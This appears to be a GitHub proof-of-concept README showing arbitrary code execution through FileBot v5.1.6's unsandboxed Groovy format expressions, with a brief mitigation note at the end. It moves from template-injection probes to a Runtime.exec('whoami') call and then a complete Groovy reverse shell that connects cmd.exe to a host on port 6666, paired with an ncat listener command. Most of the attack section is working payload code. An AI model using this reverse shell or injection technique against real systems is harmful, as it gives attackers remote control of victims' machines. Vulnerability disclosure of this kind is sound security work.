# unsandboxed-groovy-poc

Intended but Dangerous Unsandboxed Scripting Feature or Arbitrary Code Execution (ACE) / Code Injection Vulnerability?
Tested with FileBot v5.1.6


## Initial Testing

```{{7*7}}```

![image](https://github.com/user-attachments/assets/3a52a280-c553-4e50-a4e9-5d062ef6842d)


```{{7/0}}```

![image](https://github.com/user-attachments/assets/b7f54b29-5105-496b-ab7f-5d5b77ff1255)


```{"foo".toUpperCase()}```

![image](https://github.com/user-attachments/assets/cdd60f92-17ff-4ca9-99ae-bb5071bb3a24)


## Determine the backend language to be Apache Groovy

```java
${T(java.lang.Runtime).getRuntime().exec('whoami')}
```
![image](https://github.com/user-attachments/assets/78055dcd-ba25-4154-bfa4-68a8f819950a)

![image](https://github.com/user-attachments/assets/5bcdc26f-5465-40d6-8546-ca2e611ba179)


## More Testing

```java
{def shell = new GroovyShell()  }
```

![image](https://github.com/user-attachments/assets/e7d6c3a7-b16d-4989-85fa-805c5e686acd)


```java
{def shell = new GroovyShell()                           
def result = shell.evaluate '3*5'}
```

![image](https://github.com/user-attachments/assets/99230eab-3a31-4424-94ed-ec21dbed59cb)



## Reverse Shell

```java
{String host="192.168.1.X";
int port=6666;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();}
```

![image](https://github.com/user-attachments/assets/fd5f8741-2510-4072-bdff-c752a018b81c)


```bash
ncat.exe -lvnp 6666
```

![image](https://github.com/user-attachments/assets/d40a6aa4-0498-47fa-8cf0-6bab2a24dac6)


## Mitigations

If interpreting user supplied templates/commands, access to certain commands should be limited. 

https://github.com/mobeigi/filebot/blob/master/source/net/filebot/format/ExpressionFilter.java

![image](https://github.com/user-attachments/assets/d22f861b-0779-41c4-b1cb-436d6f98771b)
